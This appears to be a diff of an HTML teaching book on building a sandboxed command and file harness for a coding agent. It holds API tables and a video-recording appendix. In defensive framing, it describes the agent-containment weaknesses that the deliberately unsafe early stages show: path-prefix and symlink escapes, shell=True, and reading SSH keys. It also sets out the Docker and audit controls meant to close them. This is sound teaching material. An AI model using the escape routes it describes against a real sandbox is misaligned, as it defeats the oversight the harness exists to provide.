 <tr><td style="text-align:left"><code>run_command_tool(runner, args)</code></td><td style="text-align:left">Accepts <code>argv</code> and optional <code>cwd</code>; returns <code>OK...</code>, <code>ERROR[ARGS]</code>, <code>ERROR[DENIED]</code>, <code>ERROR[CWD]</code>, <code>ERROR[TIMEOUT]</code>, <code>ERROR[EXIT]</code>.</td></tr>
 </tbody></table></div>
-<h3 id="s103-07"><code>ch04/mini_harness/docker_runner.py</code></h3>
+<h4 id="s11-02-07"><code>ch04/mini_harness/docker_runner.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1629,7 +1513,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>DockerRunner.build_command(argv, cwd=&quot;.&quot;, name=None, env=None) -&gt; list[str]</code></td><td style="text-align:left">Pure recipe builder; asserts every hardening flag offline.</td></tr>
 <tr><td style="text-align:left"><code>DockerRunner.run(argv, cwd=&quot;.&quot;, env=None, name=None) -&gt; RunResult</code></td><td style="text-align:left">Starts the CLI, captures bounded output, removes the named container on timeout.</td></tr>
 </tbody></table></div>
-<h3 id="s103-08"><code>ch05/mini_harness/toolbox.py</code></h3>
+<h4 id="s11-02-08"><code>ch05/mini_harness/toolbox.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1638,7 +1522,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>Toolbox.specs()</code></td><td style="text-align:left">Combined prompt contract.</td></tr>
 <tr><td style="text-align:left"><code>Toolbox.run(name, args=None)</code></td><td style="text-align:left">Routes; unknown tool returns <code>ERROR[UNKNOWN_TOOL]</code>.</td></tr>
 </tbody></table></div>
-<h3 id="s103-09"><code>ch05/mini_harness/docker_tools.py</code></h3>
+<h4 id="s11-02-09"><code>ch05/mini_harness/docker_tools.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1647,7 +1531,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>format_result(result)</code></td><td style="text-align:left">Same presentation shape as ch03, with container status.</td></tr>
 <tr><td style="text-align:left"><code>run_command_tool(runner, args)</code></td><td style="text-align:left">Validates <code>argv</code>/<code>cwd</code>; runs <code>DockerRunner.run(argv, cwd=...)</code>; maps errors to observations.</td></tr>
 </tbody></table></div>
-<h3 id="s103-10"><code>ch05/mini_harness/audit.py</code></h3>
+<h4 id="s11-02-10"><code>ch05/mini_harness/audit.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1658,7 +1542,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>AuditLog.verify() -&gt; bool</code></td><td style="text-align:left">Recomputes the sequence and hash chain.</td></tr>
 <tr><td style="text-align:left"><code>_redact(value, key=None)</code></td><td style="text-align:left">Masks secret-looking keys and truncates long strings.</td></tr>
 </tbody></table></div>
-<h3 id="s103-11"><code>ch05/mini_harness/agent.py</code></h3>
+<h4 id="s11-02-11"><code>ch05/mini_harness/agent.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1670,7 +1554,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>Agent(toolbox, model, audit, max_steps=8)</code></td><td style="text-align:left">Runs the loop.</td></tr>
 <tr><td style="text-align:left"><code>Agent.run(task) -&gt; AgentResult</code></td><td style="text-align:left">Audits start, calls, results, final/max-step/error.</td></tr>
 </tbody></table></div>
-<h3 id="s103-12"><code>ch05/mini_harness/cli.py</code></h3>
+<h4 id="s11-02-12"><code>ch05/mini_harness/cli.py</code></h4>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
 <tbody>
@@ -1678,11 +1562,25 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>run_demo(workspace, build=False, max_steps=8) -&gt; int</code></td><td style="text-align:left">Build (optional), run the scripted scenario, print transcript and audit verification.</td></tr>
 <tr><td style="text-align:left"><code>main(argv=None) -&gt; int</code></td><td style="text-align:left">Uses a temporary workspace by default; returns 0 on a normal demo.</td></tr>
 </tbody></table></div>
-<h3 id="s103-13"><code>ch00</code>–<code>ch05</code> demos</h3>
-<p>Each <code>mini_harness/demo.py</code> is a runnable walkthrough, not part of the public API. Run it with <code>python -m mini_harness.demo</code>.</p>
-</section>
-<section id="s104">
-<h2><span class="num">104</span><span>Alphabetical index</span></h2>
+<h4 id="s11-02-13"><code>ch00</code>–<code>ch05</code> demos</h4>
+<p>Each <code>mini_harness/demo.py</code> is a runnable walkthrough, not part of the public API. Run it with <code>python -m mini_harness.demo</code> or directly with <code>uv run mini_harness/demo.py</code>. Stage 5 uses <code>mini_harness/__main__.py</code> instead.</p>
+<h4 id="s11-02-14"><code>ch00/mini_harness/ui.py</code> (identical in every chapter)</h4>
+<div class="table-wrap"><table>
+<thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Contract</th></tr></thead>
+<tbody>
+<tr><td style="text-align:left"><code>Theme(accent, success, warning, error, info, muted, title, box_name, icons)</code></td><td style="text-align:left">Frozen palette. Load presets and environment overrides with <code>Theme.from_env(accent=...)</code>.</td></tr>
+<tr><td style="text-align:left"><code>Theme.from_env(accent=None)</code></td><td style="text-align:left">Supports `MINI<em>HARNESS</em>THEME=dark\</td><td style="text-align:left">light\</td><td style="text-align:left">mono<code> and the </code>MINI<em>HARNESS</em>*` colour variables.</td></tr>
+<tr><td style="text-align:left"><code>UI(theme=None, accent=None, title=None, console=None)</code></td><td style="text-align:left">Wraps a Rich <code>Console</code>; per-chapter accent wins over the environment.</td></tr>
+<tr><td style="text-align:left"><code>UI.header(title=None, subtitle=None, badge=None)</code></td><td style="text-align:left">Chapter banner panel.</td></tr>
+<tr><td style="text-align:left"><code>UI.section(title)</code></td><td style="text-align:left">Coloured rule between demo sections.</td></tr>
+<tr><td style="text-align:left"><code>UI.note(label, message, kind=&quot;info&quot;, icon=None)</code></td><td style="text-align:left">Coloured card for notes, warnings, skips and errors.</td></tr>
+<tr><td style="text-align:left"><code>UI.result(label, text, kind=None)</code></td><td style="text-align:left">Observation card; infers <code>OK</code>, <code>ERROR</code>, <code>TIMEOUT</code> and <code>SKIP</code>.</td></tr>
+<tr><td style="text-align:left"><code>UI.explain(title, what, why, kind=&quot;accent&quot;)</code></td><td style="text-align:left">Teaching card after each output section: what happened and why it matters.</td></tr>
+<tr><td style="text-align:left"><code>UI.command(argv, cwd=None, title=&quot;command&quot;)</code></td><td style="text-align:left">Wrapped command panel with display-safe quoting.</td></tr>
+<tr><td style="text-align:left"><code>UI.table(title, headers, rows)</code></td><td style="text-align:left">Compact table using the shared palette.</td></tr>
+<tr><td style="text-align:left"><code>UI.done(message)</code></td><td style="text-align:left">Closing success card.</td></tr>
+</tbody></table></div>
+<h3 id="s11-03">Alphabetical index</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Name</th><th style="text-align:left">Chapter</th><th style="text-align:left">Kind</th></tr></thead>
 <tbody>
@@ -1710,9 +1608,11 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>Sandbox</code></td><td style="text-align:left">2, 5</td><td style="text-align:left">class</td></tr>
 <tr><td style="text-align:left"><code>SandboxError</code></td><td style="text-align:left">2, 5</td><td style="text-align:left">exception</td></tr>
 <tr><td style="text-align:left"><code>ScriptedModel</code></td><td style="text-align:left">5</td><td style="text-align:left">class</td></tr>
+<tr><td style="text-align:left"><code>Theme</code></td><td style="text-align:left">0–5</td><td style="text-align:left">frozen dataclass</td></tr>
 <tr><td style="text-align:left"><code>ToolSpec</code></td><td style="text-align:left">2, 5</td><td style="text-align:left">frozen dataclass</td></tr>
 <tr><td style="text-align:left"><code>Toolbox</code></td><td style="text-align:left">5</td><td style="text-align:left">class</td></tr>
 <tr><td style="text-align:left"><code>TOOL_SPECS</code></td><td style="text-align:left">2, 5</td><td style="text-align:left">constant</td></tr>
+<tr><td style="text-align:left"><code>UI</code></td><td style="text-align:left">0–5</td><td style="text-align:left">class</td></tr>
 <tr><td style="text-align:left"><code>default_command_policy()</code></td><td style="text-align:left">3</td><td style="text-align:left">function</td></tr>
 <tr><td style="text-align:left"><code>expand_variables(text, env=None)</code></td><td style="text-align:left">1–5</td><td style="text-align:left">function</td></tr>
 <tr><td style="text-align:left"><code>format_result(result)</code></td><td style="text-align:left">3, 5</td><td style="text-align:left">function</td></tr>
@@ -1724,9 +1624,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>run_tool(sandbox, name, args=None)</code></td><td style="text-align:left">2, 5</td><td style="text-align:left">function</td></tr>
 <tr><td style="text-align:left"><code>tool_names()</code></td><td style="text-align:left">2, 5</td><td style="text-align:left">function</td></tr>
 </tbody></table></div>
-</section>
-<section id="s105">
-<h2><span class="num">105</span><span>Observation vocabulary</span></h2>
+<h3 id="s11-04">Observation vocabulary</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Prefix</th><th style="text-align:left">Meaning</th></tr></thead>
 <tbody>
@@ -1747,9 +1645,7 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>ERROR[UNKNOWN_TOOL]</code></td><td style="text-align:left">No tool with that name.</td></tr>
 <tr><td style="text-align:left"><code>ERROR[INTERNAL]</code></td><td style="text-align:left">An unexpected tool bug was caught at the boundary.</td></tr>
 </tbody></table></div>
-</section>
-<section id="s106">
-<h2><span class="num">106</span><span>Constants worth knowing</span></h2>
+<h3 id="s11-05">Constants worth knowing</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Constant</th><th style="text-align:left">Where</th><th style="text-align:left">Value / purpose</th></tr></thead>
 <tbody>
@@ -1759,10 +1655,261 @@ PY</pre></figure>
 <tr><td style="text-align:left"><code>RUN_COMMAND_SPEC</code></td><td style="text-align:left">docker tools</td><td style="text-align:left">the command tool contract</td></tr>
 <tr><td style="text-align:left"><code>CHAPTER_DIR</code> / <code>DOCKER_DIR</code></td><td style="text-align:left">cli</td><td style="text-align:left"><code>ch05</code> / <code>ch05/docker</code></td></tr>
 </tbody></table></div>
+<hr>
+</section>
+<section id="s12">
+<h2><span class="num">12</span><span>Appendix E — Instructor and recording companion</span></h2>
+<div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> These notes are for an educational video series that walks through the book. The code is deliberately simplified. Do not present it as a secure, complete, or production-ready sandbox, and do not deploy it as-is.</p></div>
+<p>This appendix is the production-side companion to the six chapters. It gives you a repeatable recording workflow, a shot list for each stage, the exact commands to run on camera, and the questions your audience is most likely to ask.</p>
+<p>Use the chapters as the teaching material. Use this appendix as the run sheet.</p>
+<h3 id="s12-01">How to read the note cards</h3>
+<p>The book uses coloured callout cards throughout. Each icon has one job:</p>
+<div class="table-wrap"><table>
+<thead><tr><th style="text-align:left">Card</th><th style="text-align:left">Icon</th><th style="text-align:left">What it means on camera</th></tr></thead>
+<tbody>
+<tr><td style="text-align:left">Recording cue</td><td style="text-align:left">🎬</td><td style="text-align:left">Start, stop, or transition the take here.</td></tr>
+<tr><td style="text-align:left">Demo beat</td><td style="text-align:left">🧪</td><td style="text-align:left">Run this command or show this result on screen.</td></tr>
+<tr><td style="text-align:left">Pro tip</td><td style="text-align:left">💡</td><td style="text-align:left">A small production or teaching improvement.</td></tr>
+<tr><td style="text-align:left">Alert</td><td style="text-align:left">⚠️</td><td style="text-align:left">A common failure, safety issue, or claim to avoid.</td></tr>
+<tr><td style="text-align:left">Audience question</td><td style="text-align:left">🗣️</td><td style="text-align:left">A good question to pose before the explanation.</td></tr>
+<tr><td style="text-align:left">Edit note</td><td style="text-align:left">✂️</td><td style="text-align:left">Something to cut, shorten, or use as b-roll.</td></tr>
+</tbody></table></div>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Keep a text file open beside the recording app with the commands from the current chapter. Paste commands into the terminal instead of typing them live. It removes dead air and typo retakes.</p></div>
+<h3 id="s12-02">Series shape and timing</h3>
+<p>The six stages make six episodes plus one short series trailer. The times below are editing targets, not hard limits.</p>
+<div class="table-wrap"><table>
+<thead><tr><th style="text-align:left">Episode</th><th style="text-align:left">Chapter</th><th style="text-align:left">Target length</th><th style="text-align:left">The one-sentence promise</th></tr></thead>
+<tbody>
+<tr><td style="text-align:left">Trailer</td><td style="text-align:left">Introduction</td><td style="text-align:left">45–60 s</td><td style="text-align:left">&quot;A model can ask your computer to do things. This series builds the wall between the two.&quot;</td></tr>
+<tr><td style="text-align:left">0</td><td style="text-align:left">The naive fence</td><td style="text-align:left">8–10 min</td><td style="text-align:left">&quot;The first sandbox is always a string check. Here is why it fails.&quot;</td></tr>
+<tr><td style="text-align:left">1</td><td style="text-align:left">One path policy</td><td style="text-align:left">12–15 min</td><td style="text-align:left">&quot;Stop comparing spellings. Compare real filesystem paths.&quot;</td></tr>
+<tr><td style="text-align:left">2</td><td style="text-align:left">The sandbox and file tools</td><td style="text-align:left">12–15 min</td><td style="text-align:left">&quot;A good path is not enough: bound the bytes, the writes, and the errors.&quot;</td></tr>
+<tr><td style="text-align:left">3</td><td style="text-align:left">Running code locally</td><td style="text-align:left">14–18 min</td><td style="text-align:left">&quot;An argv allowlist is hygiene, not a jail.&quot;</td></tr>
+<tr><td style="text-align:left">4</td><td style="text-align:left">Docker as the real wall</td><td style="text-align:left">16–20 min</td><td style="text-align:left">&quot;Move the command into a container and make the boundary explicit.&quot;</td></tr>
+<tr><td style="text-align:left">5</td><td style="text-align:left">The finished harness</td><td style="text-align:left">16–20 min</td><td style="text-align:left">&quot;Route tools, limit the loop, and leave an audit trail you can verify.&quot;</td></tr>
+</tbody></table></div>
+<div class="callout"><p><strong>Edit note:</strong> ✂️ A 15-minute target usually means a 25–35 minute raw take. Record one section at a time so a mistake costs one section, not the episode.</p></div>
+<h3 id="s12-03">Pre-record checklist</h3>
+<p>Run this before every session. It takes two minutes and saves retakes.</p>
+<ol>
+<li>Activate the virtual environment.</li>
+<li>Confirm Python and pytest are available.</li>
+<li>Confirm Docker is running for Stages 4–5.</li>
+<li>Build the container image once, before recording.</li>
+<li>Run the chapter demo and tests off camera.</li>
+<li>Clear terminals, browser tabs, notifications, and personal file paths.</li>
+<li>Increase terminal font size. Use a light or dark theme with high contrast.</li>
+<li>Check microphone levels and record a ten-second test.</li>
+</ol>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 The demos render with Rich panels and colours. Keep colour on for a recording; use <code>NO_COLOR=1</code> or <code>MINI_HARNESS_THEME=mono</code> when you want a plain transcript for a log or CI artifact. Each chapter has its own accent, so the same terminal theme looks consistent across the series.</p></div>
+<figure class="code"><figcaption><span>powershell</span><span class="lang">powershell</span></figcaption><pre># Windows PowerShell, from the repository root
+.\.venv\Scripts\Activate.ps1
+python --version
+python -m pytest ch00 -q
+docker version</pre></figure>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre># macOS / Linux, from the repository root
+source .venv/bin/activate
+python --version
+python -m pytest ch00 -q
+docker version</pre></figure>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Do not record Stage 0 with a real home directory visible in the terminal or on screen. The demo is deliberately unsafe. Use the throwaway <code>tempfile.TemporaryDirectory</code> in the chapter demo, and blur or rename any personal paths in the shell prompt.</p></div>
+<h3 id="s12-04">Screen and scene setup</h3>
+<p>A simple two-scene OBS layout is enough for the whole series.</p>
+<div class="table-wrap"><table>
+<thead><tr><th style="text-align:left">Scene</th><th style="text-align:left">Contents</th><th style="text-align:left">Use it for</th></tr></thead>
+<tbody>
+<tr><td style="text-align:left"><code>Talking head</code></td><td style="text-align:left">Camera, soft light, book cover or chapter title card</td><td style="text-align:left">Cold open, transitions, conclusions</td></tr>
+<tr><td style="text-align:left"><code>Code</code></td><td style="text-align:left">Full-screen editor or terminal, small camera overlay</td><td style="text-align:left">Walkthroughs and demos</td></tr>
+<tr><td style="text-align:left"><code>Diagram</code></td><td style="text-align:left">One slide with the boundary diagram</td><td style="text-align:left">Explaining the concept before code</td></tr>
+</tbody></table></div>
+<p>Keep the terminal at roughly 18–22 pt. Keep lines under 90 characters. If a command is long, put it in a shell script and show the script, then run it.</p>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Record at 1080p, not 4K, if you plan to zoom into code. A 1080p canvas with a clean 18 pt terminal is easier to read after compression than a 4K canvas scaled down.</p></div>
+<h3 id="s12-05">Episode run sheets</h3>
+<h4 id="s12-05-01">Trailer and introduction</h4>
+<p><strong>Show:</strong> the six-stage table from the Introduction, then a five-second clip of the Stage 5 demo ending with <code>audit chain verifies: True</code>.</p>
+<p><strong>Say:</strong> &quot;A coding agent is a loop that turns text into operating-system actions. This series is about that conversion point: what a tool may do, how much it may consume, and what the model sees when it is refused.&quot;</p>
+<p><strong>Do not say:</strong> &quot;This is how to build a secure agent.&quot; Say: &quot;This is how to build and understand the boundary.&quot;</p>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 End the trailer on the promise of the Stage 3 cliffhanger: the local runner is still not a jail. That is the hook for Episode 4.</p></div>
+<h4 id="s12-05-02">Episode 0 — The naive fence</h4>
+<p><strong>Open with the bug, not the theory.</strong> Show the three-line prefix check and ask the audience to spot the flaw before you explain it.</p>
+<p><strong>Demo beats:</strong></p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch00
+python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+<p><strong>Show on screen:</strong> the <code>[leaked]</code> prefix-sibling result and the <code>[blocked]</code> plain traversal result. If the symlink case skips on Windows, say why.</p>
+<p><strong>Talking points:</strong></p>
+<ul>
+<li><code>startswith</code> compares spellings, not filesystem identities.</li>
+<li><code>abspath</code> collapses <code>.</code> and <code>..</code>; it does not resolve symlinks.</li>
+<li><code>shell=True</code> turns one request into a small program.</li>
+<li>The tests assert the bad outcomes so the failure is reproducible.</li>
+</ul>
+<div class="callout"><p><strong>Audience question:</strong> 🗣️ &quot;If the path starts with the workspace folder, is it inside the workspace?&quot; Pause. Then show <code>workspace-evil</code>.</p></div>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Never run the Stage 0 shell demo against your real home folder. Keep the harmless <code>echo</code> example. The point is the shape of the call.</p></div>
+<h4 id="s12-05-03">Episode 1 — One path policy</h4>
+<p><strong>Open with the question:</strong> &quot;Which file will the kernel actually open?&quot; That is the whole chapter.</p>
+<p><strong>Demo beats:</strong></p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch01
+python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+<p><strong>Show on screen:</strong> a normal read, a traversal refusal, and the prefix-sibling refusal, all through the same <code>PathPolicy</code>.</p>
+<p><strong>Diagram:</strong> <code>requested path -&gt; lexical normalise -&gt; resolve deepest existing ancestor -&gt; compare real paths -&gt; allow or refuse</code>.</p>
+<p><strong>Talking points:</strong></p>
+<ul>
+<li>One policy for every tool; no tool invents a second check.</li>
+<li>Reads may be absolute inside the root; writes must be relative.</li>
+<li><code>commonpath</code> understands boundaries; <code>startswith</code> does not.</li>
+<li>The TOCTOU gap remains, and Stage 4 is the real answer.</li>
+</ul>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Put the <code>commonpath</code> comparison on screen as a single code block. Do not scroll through the whole module while explaining it.</p></div>
+<h4 id="s12-05-04">Episode 2 — The sandbox and file tools</h4>
+<p><strong>Open with the failure modes:</strong> a 2 GB read, a million-entry directory, a half-written file, a silent replace of three identical snippets.</p>
+<p><strong>Demo beats:</strong></p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch02
+python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+<p><strong>Show on screen:</strong> one successful write, then <code>TOO_LARGE</code>, <code>EXISTS</code>, <code>AMBIGUOUS</code>, and <code>PATH</code> observations. Point out that no traceback reaches the model.</p>
+<p><strong>Talking points:</strong></p>
+<ul>
+<li>Limits protect the agent process, not the host kernel.</li>
+<li>Atomic write: temp file in the same directory, fsync, replace.</li>
+<li>Edit is unique by default; <code>count=0</code> is an explicit opt-in.</li>
+<li>Delete is file-only; recursive delete is a different blast radius.</li>
+<li>Errors are observations, so the loop can continue.</li>
+</ul>
+<div class="callout"><p><strong>Audience question:</strong> 🗣️ &quot;Why not just catch the exception and return it?&quot; Answer: a traceback is noise in the model's context and can leak host paths. A stable error code is a contract.</p></div>
+<div class="callout"><p><strong>Edit note:</strong> ✂️ The symlink-write test can skip on Windows. Record the skip once, explain it, and move on. Do not fight the OS on camera.</p></div>
+<h4 id="s12-05-05">Episode 3 — Running code locally</h4>
+<p><strong>Open with the one-liner everyone writes:</strong> <code>subprocess.run(user_string, shell=True)</code>. Then list what that single line gives the model.</p>
+<p><strong>Demo beats:</strong></p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch03
+python -m mini_harness.demo
+python -m pytest -v</pre></figure>
+<p><strong>Show on screen:</strong> argv refusal, clean-environment sentinel, timeout kill, and the final honest demo where the child reads a file outside the workspace.</p>
+<p><strong>Talking points:</strong></p>
+<ul>
+<li>Argv, not a string: a semicolon is an argument, not a second command.</li>
+<li>Absolute-path allowlist; do not use <code>shutil.which</code> for model input.</li>
+<li>Clean environment: build it, do not inherit it.</li>
+<li>Timeout kills the process tree, not just the direct child.</li>
+<li>Output caps must keep draining the pipe or the child hangs.</li>
+<li>POSIX rlimits are not portable; Docker is the portable boundary.</li>
+</ul>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 End the episode on the outside-read result. Say: &quot;That is not a bug in Stage 3. That is the reason Stage 4 exists.&quot; Cut to black.</p></div>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Do not claim the local runner is a sandbox. Call it hygiene, a guardrail, or accident prevention. The chapter says this explicitly; keep the video consistent with it.</p></div>
+<h4 id="s12-05-06">Episode 4 — Docker as the real wall</h4>
+<p><strong>Open with the threat Stage 3 cannot stop:</strong> the child process can read the user's SSH keys and open a network connection.</p>
+<p><strong>Pre-record:</strong> start Docker Desktop and build the image before the take.</p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch04
+docker build -t mini-harness-python:latest docker
+python -m mini_harness.demo
+python -m mini_harness.demo --build
+python -m pytest -v</pre></figure>
+<p><strong>Show on screen:</strong> the full <code>docker run</code> argv, then the four live behaviours: Python runs, network fails, root write fails, workspace is visible.</p>
+<p><strong>Talking points:</strong></p>
+<ul>
+<li>Every flag in the run contract is a deliberate decision with a test.</li>
+<li><code>--read-only</code> freezes the image, not the workspace bind mount.</li>
+<li><code>--network none</code>, <code>--cap-drop ALL</code>, and <code>no-new-privileges</code> remove easy exits.</li>
+<li>Timeout cleanup needs <code>docker rm -f</code>; killing the CLI is not enough.</li>
+<li>The container shares the host kernel. It is a boundary, not magic.</li>
+</ul>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Put the flag table on screen as an overlay while the command runs. Pause on the four or five flags that matter most; do not read all of them aloud.</p></div>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Never mount the Docker socket into the sandbox, never add <code>--privileged</code>, and do not show a command that writes to the host outside the workspace.</p></div>
+<h4 id="s12-05-07">Episode 5 — The finished harness</h4>
+<p><strong>Open with the missing piece:</strong> we have boundaries but no agent loop and no record of what happened.</p>
+<p><strong>Demo beats:</strong></p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch05
+python -m mini_harness
+python -m mini_harness --build
+python -m pytest -v</pre></figure>
+<p><strong>Show on screen:</strong> the write, the read, the container run, the final answer, and <code>audit chain verifies: True</code>. Then show the audit JSONL and point at <code>seq</code>, <code>prev</code>, and <code>hash</code>.</p>
+<p><strong>Talking points:</strong></p>
+<ul>
+<li>The toolbox routes; it does not invent a second policy.</li>
+<li>The step limit lives in the loop, not in the model.</li>
+<li>A refusal is an observation; infrastructure absence still ends the loop.</li>
+<li>The audit is append-only, hash-chained, outside the workspace, and redacted.</li>
+<li>Tampering breaks <code>verify()</code>; the chain makes it visible, not impossible.</li>
+</ul>
+<div class="callout"><p><strong>Audience question:</strong> 🗣️ &quot;Why not let the model decide when to stop?&quot; Answer: a model may loop forever; the harness may not.</p></div>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Close the series on the audit line, then a title card: &quot;The boundary is the product.&quot; Keep the final take under 20 seconds.</p></div>
+<h3 id="s12-06">Demo reset between takes</h3>
+<p>Run these commands to return to a clean state. They are safe: they only remove generated caches, audit files, and the chapter's sample output.</p>
+<figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre># From the repository root
+find . -name &quot;__pycache__&quot; -type d -prune -exec rm -rf {} +
+find . -name &quot;.pytest_cache&quot; -type d -prune -exec rm -rf {} +
+rm -f ch05/audit/events.jsonl ch05/hello.py</pre></figure>
+<figure class="code"><figcaption><span>powershell</span><span class="lang">powershell</span></figcaption><pre># Windows PowerShell
+Get-ChildItem -Recurse -Directory -Filter __pycache__ | Remove-Item -Recurse -Force
+Get-ChildItem -Recurse -Directory -Filter .pytest_cache | Remove-Item -Recurse -Force
+Remove-Item ch05\audit\events.jsonl, ch05\hello.py -ErrorAction SilentlyContinue</pre></figure>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Re-run the chapter demo once after cleanup and before the take. A fresh run gives you the exact output you will point at later.</p></div>
+<h3 id="s12-07">Common recording failures</h3>
+<div class="table-wrap"><table>
+<thead><tr><th style="text-align:left">Symptom</th><th style="text-align:left">Likely cause</th><th style="text-align:left">Fix</th></tr></thead>
+<tbody>
+<tr><td style="text-align:left"><code>ModuleNotFoundError: mini_harness</code></td><td style="text-align:left">Ran from the repository root, not the chapter</td><td style="text-align:left"><code>cd ch00</code> (or the right chapter) first</td></tr>
+<tr><td style="text-align:left"><code>pytest: command not found</code></td><td style="text-align:left">Virtual environment not active</td><td style="text-align:left">Activate <code>.venv</code>, or use <code>python -m pytest</code></td></tr>
+<tr><td style="text-align:left">Docker demo prints <code>ERROR[DOCKER_MISSING]</code></td><td style="text-align:left">Docker Desktop is not running</td><td style="text-align:left">Start Docker, wait for the whale icon, retry</td></tr>
+<tr><td style="text-align:left">Docker integration tests skip</td><td style="text-align:left">Image not built</td><td style="text-align:left"><code>docker build -t mini-harness-python:latest docker</code> from <code>ch04/</code></td></tr>
+<tr><td style="text-align:left">Symlink test skips on Windows</td><td style="text-align:left">Developer Mode or elevation is off</td><td style="text-align:left">Explain the skip; do not enable Developer Mode just for the take</td></tr>
+<tr><td style="text-align:left">Audit verification fails on a second run</td><td style="text-align:left">Old audit log has a broken chain</td><td style="text-align:left">Remove <code>ch05/audit/events.jsonl</code> deliberately and re-run</td></tr>
+<tr><td style="text-align:left">Terminal text is unreadable after upload</td><td style="text-align:left">Font too small or too many columns</td><td style="text-align:left">18–22 pt, wrap at 90 columns, enlarge the editor</td></tr>
+</tbody></table></div>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ If a test fails on camera, do not hide it. Show the failure, read the error code, and explain which contract caught it. That is better teaching than a suspiciously perfect run.</p></div>
+<h3 id="s12-08">Audience questions to plant</h3>
+<p>Use one question per episode as a cold open or a transition. They give the audience a reason to keep watching.</p>
+<ol>
+<li><strong>Stage 0:</strong> &quot;What is the difference between a path that looks inside and a file that opens inside?&quot;</li>
+<li><strong>Stage 1:</strong> &quot;Why is <code>startswith</code> the wrong tool for containment?&quot;</li>
+<li><strong>Stage 2:</strong> &quot;What should a model see when a tool refuses?&quot;</li>
+<li><strong>Stage 3:</strong> &quot;If the command runner is allowlisted, why can it still read your SSH keys?&quot;</li>
+<li><strong>Stage 4:</strong> &quot;Why is a read-only root filesystem not a read-only workspace?&quot;</li>
+<li><strong>Stage 5:</strong> &quot;How do you prove that nobody edited the audit log?&quot;</li>
+</ol>
+<h3 id="s12-09">Titles, thumbnails, and descriptions</h3>
+<p>Keep titles concrete and outcome-led. Avoid claiming security guarantees.</p>
+<div class="table-wrap"><table>
+<thead><tr><th style="text-align:left">Episode</th><th style="text-align:left">Title idea</th><th style="text-align:left">Thumbnail text</th></tr></thead>
+<tbody>
+<tr><td style="text-align:left">Trailer</td><td style="text-align:left">Build a Mini Python Sandbox</td><td style="text-align:left">&quot;The boundary is the product&quot;</td></tr>
+<tr><td style="text-align:left">0</td><td style="text-align:left">The sandbox that isn't</td><td style="text-align:left"><code>startswith</code> is not enough</td></tr>
+<tr><td style="text-align:left">1</td><td style="text-align:left">One path policy to rule them all</td><td style="text-align:left">Real paths, not spellings</td></tr>
+<tr><td style="text-align:left">2</td><td style="text-align:left">File tools that refuse safely</td><td style="text-align:left">Errors are observations</td></tr>
+<tr><td style="text-align:left">3</td><td style="text-align:left">Running code without <code>shell=True</code></td><td style="text-align:left">Argv. Timeout. Clean env.</td></tr>
+<tr><td style="text-align:left">4</td><td style="text-align:left">Docker is the real wall</td><td style="text-align:left">No network. No caps.</td></tr>
+<tr><td style="text-align:left">5</td><td style="text-align:left">The finished agent harness</td><td style="text-align:left">Audit chain verifies: True</td></tr>
+</tbody></table></div>
+<p>Description footer for every episode:</p>
+<div class="callout"><p>Educational content only. This is not a production-ready sandbox. Do not deploy the code as-is. See the repository's <code>README.md</code> and <code>THREAT_MODEL.md</code> for the full limits.</p></div>
+<h3 id="s12-10">Editing notes</h3>
+<ul>
+<li><strong>Keep the failure.</strong> A refusal or a failed test is the lesson, not a blooper.</li>
